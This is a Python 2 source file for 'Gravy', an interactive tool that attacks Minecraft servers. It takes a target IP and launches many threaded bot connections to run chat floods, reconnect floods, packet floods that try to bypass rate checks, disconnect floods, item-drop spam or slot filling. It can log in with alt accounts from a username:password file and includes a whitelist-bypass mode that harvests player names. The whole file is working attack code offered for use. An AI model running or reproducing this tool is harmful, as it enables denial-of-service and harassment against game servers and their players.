from SyncPrint import *
import gravylib, socks, time, random, threading, string, ProxyManager, sys, binascii, time
print '--==[ Gravy ]==--'
print
print '--==[ Developed By @Arm4x and @marcog ]==--'
print
print 'Minecraft version:'
print '[1] 1.8 -> 1.8.9'
print '[2] 1.9'
print '[3] 1.9.1'
print '[4] 1.9.2'
print '[5] 1.9.3 -> 1.9.4'
print '[6] 1.10'
print
proto = input('Select minecraft version: ')

if proto == 1:
    protonum = 47
elif proto == 2:
    protonum = 107
elif proto == 3:
    protonum = 108
elif proto == 4:
    protonum == 109
elif proto == 5:
    protonum = 110
elif proto == 6:
    protonum = 210
else:
    synckill('\n[!] Invalid option!')

target = raw_input('Select ip: ')
threads = input('Select thread: ')
pCount = 2
singleMessage = False
print
print '[i] Attack type.'
print
print '[1] Creative drop\t# Random item drop (must have a creative account)'
print '[2] Chat flood\t\t# no need to explain'
print '[3] Reconnect flood\t# Spam with left and join messages!'
print '[4] Packet flood\t# Tries to bypass reconnect flood check'
print '[5] Timeout\t\t# Disconnect flood on some server'
print '[6]\xc2\xa0Slot fuller\t\t# Fill the server with bot'
print
optionatt = input('Select an attack option: ')
if optionatt == 1:
    creativeDrop = True
    chatFlood = False
    reconnectFlood = False
    packetFlood = False
    timeout = False
    prependFlood = ''
    staticFloodMessage = ''
    authFlood = False
if optionatt == 2:
    creativeDrop = False
    chatFlood = True
    staticFloodMessage = raw_input('Static Flood message. If = , randomness: ')
    prependFlood = ''
    reconnectFlood = False
    packetFlood = False
    timeout = False
    authFlood = False
if optionatt == 3:
    creativeDrop = False
    chatFlood = False
    reconnectFlood = True
    packetFlood = False
    timeout = False
    prependFlood = ''
    staticFloodMessage = ''
    authFlood = False
if optionatt == 4:
    creativeDrop = False
    chatFlood = False
    reconnectFlood = False
    packetFlood = True
    timeout = False
    prependFlood = ''
    staticFloodMessage = ''
    authFlood = False
if optionatt == 5:
    creativeDrop = False
    chatFlood = False
    reconnectFlood = False
    packetFlood = False
    timeout = True
    prependFlood = ''
    staticFloodMessage = ''
    authFlood = False
if optionatt == 6:
    creativeDrop = False
    chatFlood = False
    reconnectFlood = False
    packetFlood = False
    timeout = False
    prependFlood = ''
    staticFloodMessage = ''
    authFlood = False

print
print '[i] Nick option'
print
print '[1] Alts\t# For premium server. They must be in username:password format in alts.txt'
print '[2] Random\t# Random nicks'
print '[3] Nicklist\t# Nick from list, Takes a random from nicks.txt'
print '[4] Static\t# Predefined, single nick'
print
optionick = input('Select a nick option: ')
if optionick == 1:
    nickMode = 'alts'
    masterNick = ''
if optionick == 2:
    nickMode = 'random'
    option2 = raw_input('Do you want to use a prepend(y/n): ')
    if option2 == 'y':
        prepend = raw_input('Insert the prepend: ')
    if option2 == 'n':
        prepend = ''
    masterNick = ''
if optionick == 3:
    nickMode = 'nicklist'
    masterNick = ''
if optionick == 4:
    nickMode = 'static'
    staticNick = raw_input('Insert the nick: ')
    masterNick = ''
if optionick == 5:
    nickMode = 'no'
    masterNick = raw_input('Insert the whitelisted nick: ')
canReconnect = False
skipNicks = [masterNick]

def parse_ip(target, default = 25565):
    srv = target.replace('\n', '').split(':')
    if len(srv) == 1:
        prt = default
    else:
        prt = int(srv[1])
    return {'ip': srv[0],
     'port': prt}


target = parse_ip(target)
thhreads = list()
fl = open(target['ip'] + '.nickpool.txt', 'a+', 0)
nicks = ['TheGame']
if nickMode == 'alts':
    nicks = open('alts.txt').readlines()
elif nickMode == 'nicklist':
    nicks = open('nicks.txt').readlines()
elif nickMode == 'bypass':
    fl = open(target['ip'] + '.nickpool.txt', 'a+', 0)
    nicks = fl.readlines()
    syncprint('Loading whitelist bypass!')

    def event(id, object):
        if id == '\xc9':
            name = object._readString().replace('\xa7f', '')
            isOnline = object._getBytes(1)
            ping = object._getBytes(2)
            if name in skipNicks:
                return True
            if name in nicks:
                return True
            object._log('Adding ' + name)
            nicks.append(name)
            jobs.append((name.replace('\n', ''), ''))
            fl.write(name + '\n')
            return True
        return False


    def eventHook():
        while True:
            x = time.time()
            gravylib.CraftPlayer(masterNick, password='', proxy='', server=(target['ip'], int(target['port'])), eventHook=event, debug=False)._connect()
            while time.time() - x <= 4:
                time.sleep(1)

            print '-> Reconnecting'

        return


    th = threading.Thread(target=eventHook)
    th.daemon = True
    thhreads.append(th)
    th.start()
elif nickMode == 'static':
    nicks = list()
    for x in xrange(1, 50):
        nicks.append(staticNick)

actions = []
if creativeDrop == True:
    actions.append('creativeDrop')
if chatFlood == True:
    actions.append('chatFlood')
if reconnectFlood == True:
    actions.append('reconnectFlood')
if packetFlood == True:
    actions.append('pFlood')
if singleMessage == True:
    actions.append('sM')
if timeout == True:
    actions.append('tO')
if authFlood == True:
    actions.append('authFlood')
syncprint('======== Gravy 1.0 ========')
syncprint('')
syncprint('[i] Starting...')
syncprint('')
jobs = list()
lk = threading.Lock()

def cbck(x, y):
    try:
        jobs.remove((y._nickname, y._password))
    except:
        pass

    print 'callback'


def ThreadEntry():
    with lk:
        pass
    while True:
        try:
            if nickMode == 'random':
                job = (prepend + ''.join((random.choice(string.letters + string.digits) for x in range(random.randint(6 - len(prepend), 15 - len(prepend))))), '')
            else:
                with lk:
                    job = jobs.pop(0)
                    jobs.append(job)
            nickname, password = job
            gravylib.CraftPlayer(nickname, password=password, protonum=protonum ,proxy='', server=(target['ip'], int(target['port'])), attacks=actions, prependFlood=prependFlood, msg=staticFloodMessage, debug=False, printchat=False, count=pCount, callback=cbck)._connect()
        except:
            pass
        #break


for nickname in nicks:
    password = ''
    if nickMode == 'alts':
        nickname, password = nickname.replace('\n', '').split(':')
    jobs.append((nickname.replace('\n', ''), password))

print 'Loading threads..'
with lk:
    for x in xrange(threads):
        th = threading.Thread(target=ThreadEntry)
        th.daemon = True
        thhreads.append(th)
        th.start()

print 'Running!'
try:
    while True:
        time.sleep(1000)

except (KeyboardInterrupt, SystemExit):
    synckill('\nReceived keyboard interrupt, quitting!')
